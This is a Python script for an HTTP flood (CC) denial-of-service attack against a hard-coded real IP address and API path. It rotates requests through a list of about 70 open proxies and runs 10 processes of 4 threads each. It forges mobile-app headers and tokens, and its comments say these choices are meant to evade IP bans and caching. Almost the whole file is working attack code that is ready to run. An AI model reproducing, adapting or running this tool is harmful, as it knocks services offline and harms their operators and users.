import sys
sys.path.append('C:\ProxyPool\WebApi')
from apis import get_proxy


from multiprocessing import Pool as ProcessPool
from multiprocessing.dummy import Pool as ThreadPool
from multiprocessing import Process
import requests
import random
import redis


class AttackTT:
    def __init__(self):
        self.url = 'http://123.206.219.117/peipeindex/top/getlist?type={}'
        # self.url = 'http://127.0.0.1:24422'
        self.jobs = 100
        self.processnum = 10
        self.threadnum = 4
        self.method = 'get'
        self.post = None
        self.proxies_list = ['39.108.56.6:3128', '124.238.235.135:8000', '183.179.199.225:8080', '39.134.68.23:80', '120.52.73.1:96', '103.27.24.114:80', '124.207.178.174:9090', '171.217.92.33:9090', '123.57.76.102:80', '118.144.149.206:3128', '39.137.77.68:80', '119.28.50.37:82', '39.137.69.9:80', '171.10.31.74:8080', '60.205.205.48:80', '171.10.31.73:80', '120.92.88.202:10000', '140.205.222.3:80', '101.4.136.34:8080', '123.161.16.48:9797', '183.2.212.2:3128', '166.111.80.162:3128', '114.228.73.32:6666', '54.222.177.145:3128', '171.10.31.73:8080', '119.39.48.205:9090', '39.137.69.7:80', '103.242.219.242:8080', '39.137.69.8:80', '171.10.31.74:80', '119.27.177.169:80', '103.235.245.35:8080', '121.8.98.196:80', '124.133.230.254:80', '218.59.139.238:80', '39.137.69.10:80', '61.136.163.244:8103', '202.100.83.139:80', '118.212.137.135:31288', '111.62.243.64:8080', '113.200.56.13:8010', '59.44.16.6:8000', '121.8.98.198:80', '101.96.11.4:80', '58.247.46.123:8088', '218.241.234.48:8080', '101.96.10.4:80', '117.127.0.205:8080', '120.79.133.212:8088', '218.93.207.26:8088', '101.4.136.34:80', '117.127.0.204:8080', '114.250.29.45:9090', '123.232.119.125:80', '39.137.69.7:8080', '39.134.14.66:8080', '125.46.69.18:3128', '211.21.120.163:8080', '118.26.164.5:80', '221.7.255.168:80', '59.44.16.6:80', '202.38.92.100:3128', '112.73.6.40:3128', '120.52.73.1:8095', '223.85.196.75:9999', '111.62.243.64:80', '183.56.177.130:808', '42.123.127.1:3128', '39.137.77.66:80', '101.248.64.66:8080', '119.28.152.208:80']


    def cc_website(self, jobs):
        # theader = {}
        #生成http头部，防止封杀IP
        headers = uti.make_headers()
        tmp_proxy = random.choice(self.proxies_list)
        data_post = {}
        if self.method.upper == 'POST':
            data_post = uti.make_data(self.post)
        while jobs > 0:
        #生成随机参数，防止缓存
            if self.method.upper() == 'POST':
                try:
                    response = requests.post(self.url, headers=headers, proxies={'http':'http://{}'.format(tmp_proxy)} ,data=data_post ,timeout=10)
                    if response.status_code == 200:
                        print ('Attack website {} success with proxy {}, got result {}'.format(self.url, tmp_proxy, response.json()))
                        # print ('Use proxy %s success' % (proxy.strip()))
                except Exception as e:
                    print('Attack failed with error:{}'.format(e.args))
            elif self.method.upper() == 'GET':
                try:
                    rand_int = random.randint(1,4)
                    response = requests.get(self.url.format(rand_int), headers= headers, proxies = {'http':'http://{}'.format(tmp_proxy)} ,timeout = 20)
                    if response.status_code == 200:
                        print ('Attack website {} success with proxy {}, got result {}'.format(self.url, tmp_proxy, response.json()))
                        # print ('Use proxy %s success' % (proxy.strip()))
                except Exception as e:
                    print('Attack failed with error:{}'.format(e.args))
            jobs -= 1

    '''
    cc主函数-新建测试线程
    '''
    def mk_threading(self, jobs, threadnum):

        threadsPool = ThreadPool(threadnum)
        try:
            result = threadsPool.map(self.cc_website, [100]*jobs) #关键操作
            threadsPool.close()
            threadsPool.join()
        except Exception as e:
            print(e)

    '''
    cc主函数-新建测试进程
    '''
    def mk_process(self,jobs, processnum, threadnum):
        Processpools = ProcessPool(processnum)
        for i in range(processnum):
            Processpools.apply_async(self.mk_threading, args=(jobs, threadnum))
        print ('CC start...')
        print ('Waiting for all subprocesses done...')
        Processpools.close()
        Processpools.join()
        print ('All subprocesses done.')

    '''
    cc主函数
    '''
    def attack_cc(self):
        jobs = 1000
        processnum = 10
        threadnum = 4
        self.mk_process(jobs, processnum, threadnum)

class Utils:
    def __init__(self):
        self.t = '1170f864930b85834f2aa482cd1eb447df4d'
        self.t1 = '8353dcda0ab798494302982f424e2d698fd3'
        self.k = 'be3d8184176377538b026f9231added9'
        self.cpsUsername = 'fm_0001'
        self.h = '01200156fm_0001'
        self.driveid = '868453026613028'

    def make_headers(self):
        headers = {'User-Agent': 'okhttp/3.8.1',
            'Accept-Encoding': 'gzip',
            'Connection': 'Keep-Alive',
            'host': '123.206.219.117',
            'k':self.k,
            'h':'01200156fm_0001',
            't':self.make_data(36),
            't1':self.make_data(36),
            'driveid':self.driveid,
            'cpsUsername':'fm_0001'}
        return headers

    def make_data(self, length):
        str_list = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
        return ''.join([random.choice(str_list) for i in range(length)])

    def getImei(self):
        num = '86'
        suma = 0
        for i in range(0, 11):
            digit = random.randrange(0, 9)
            suma = suma + digit
            num = num + str(digit)
        suma = suma * 9
        digit = suma % 10
        num = num + str(digit)
        return num

if __name__ == '__main__':
    atc = AttackTT()
    uti = Utils()
    atc.attack_cc()

else:
    atc = AttackTT()
    uti = Utils()
